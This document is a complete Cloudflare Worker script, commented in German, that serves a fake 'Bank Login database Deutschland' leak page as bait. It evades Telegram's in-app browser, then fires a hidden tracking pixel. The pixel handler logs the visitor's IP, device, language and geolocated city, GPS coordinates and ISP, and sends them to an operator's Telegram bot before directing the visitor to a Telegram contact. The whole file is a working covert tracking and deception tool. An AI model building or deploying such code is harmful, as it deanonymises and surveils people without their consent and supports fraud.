export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // --- TEIL 1: DIE LANDING PAGE (Erkennt Telegram und blockt es) ---
    if (url.pathname === "/" || url.pathname === "/leak") {
      const ua = request.headers.get("User-Agent") || "";
      
      // Prüfen, ob der User im Telegram In-App-Browser ist
      const isTelegram = ua.includes("TelegramBot") || ua.includes("Telegram");

      if (isTelegram) {
        // TELEGRAM ANSICHT: Nur ein Button, kein Inhalt, kein Tracker!
        const html = `
        <!DOCTYPE html>
        <html lang="de">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>dumps11-02-2026 (Bank Login database Deutschland)</title>
            <style>
                body { background-color: #0a0a0a; color: #ccc; font-family: sans-serif; margin: 0; padding: 20px; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
                .btn { display: block; width: 100%; max-width: 350px; padding: 18px; background-color: #e0e0e0; color: #000; text-decoration: none; font-weight: bold; font-size: 16px; text-transform: uppercase; border-radius: 5px; }
            </style>
        </head>
        <body>
            <div>
                <p style="color:#888; font-size:14px;">Sicherheits-Gateway blockiert diesen Browser.</p>
                <a href="${url.origin}?browser=1&c=dumps_db" class="btn">Open in Browser to login</a>
            </div>
        </body>
        </html>
        `;
        return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
      }

      // ECHTER BROWSER ANSICHT (Safari/Chrome) - Hier feuert der Tracker!
      const html = `
      <!DOCTYPE html>
      <html lang="de">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>dumps11-02-2026 (Bank Login database Deutschland)</title>
          <style>
              body { background-color: #0a0a0a; color: #cccccc; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
              .container { max-width: 800px; margin: 20px auto; background: #111; border: 1px solid #222; padding: 30px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }
              h1 { color: #ffffff; font-size: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; margin-top: 0; }
              .meta { font-size: 13px; color: #777; margin-bottom: 40px; display: flex; justify-content: space-between; }
              .btn { display: block; width: 100%; padding: 18px; background-color: #e0e0e0; color: #000; text-align: center; text-decoration: none; font-weight: bold; font-size: 15px; text-transform: uppercase; border: none; cursor: pointer; }
              .footer { margin-top: 40px; font-size: 11px; color: #444; text-align: center; text-transform: uppercase; letter-spacing: 2px; }
          </style>
      </head>
      <body>
          <div class="container">
              <h1>dumps11-02-2026 (Bank Login database Deutschland)</h1>
              
              <div class="meta">
                  <span>Format: CSV</span>
                  <span>Rows: 4,829,102</span>
                  <span>Size: 1.2 GB</span>
                  <span>Status: Unencrypted</span>
              </div>

              <!-- DER TRACKER FEUERT JETZT, DA WIR IM ECHTEN BROWSER SIND -->
              <img src="/pixel?c=dumps_db" style="display:none;" />

              <!-- DER BUTTON (Leitet weiter) -->
              <a href="https://t.me/dein_telegram_username" class="btn">Database entschlüsseln</a>

              <div class="footer">
                  Secure Gateway | Protocol 443 | Session Encrypted
              </div>
          </div>
      </body>
      </html>
      `;
      return new Response(html, { headers: { "Content-Type": "text/html; charset=utf-8" } });
    }

    // --- TEIL 2: DER LOGGER ---
    if (url.pathname === "/pixel") {
      const ip = request.headers.get("CF-Connecting-IP") || "unknown";
      const ua = request.headers.get("User-Agent") || "unknown";
      const lang = request.headers.get("Accept-Language") || "unknown";
      const tag = url.searchParams.get("c") || "unbekannt";
      const t = new Date().toISOString();

      let loc = "Unbekannt", isp = "Unbekannt", asn = "Unbekannt";
      let lat = "?", lon = "?";

      try {
        const res = await fetch(`https://ipwho.is/${ip}`);
        const data = await res.json();
        if (data.success) {
          loc = `${data.city || '?'}, ${data.country || '?'}`;
          isp = data.connection?.isp || "?";
          asn = `AS${data.connection?.asn || '?'}`;
          lat = data.latitude || "?";
          lon = data.longitude || "?";
        }
      } catch (e) {}

      if (env.BOT_TOKEN && env.CHAT_ID) {
        const msg = 
          `Tag: ${tag}\n` +
          `IP: ${ip}\n` +
          `Ort: ${loc}\n` +
          `GPS: ${lat}, ${lon}\n` +
          `Provider: ${isp}\n` +
          `ASN: ${asn}\n` +
          `Sprache: ${lang}\n` +
          `Device: ${ua}\n` +
          `Zeit: ${t}`;

        try {
          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: env.CHAT_ID, text: msg })
          });
        } catch (e) {}
      }

      const gif = Uint8Array.from(atob("R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw=="), c => c.charCodeAt(0));
      return new Response(gif, { headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" } });
    }

    return new Response("404 Not Found", { status: 404 });
  }
};
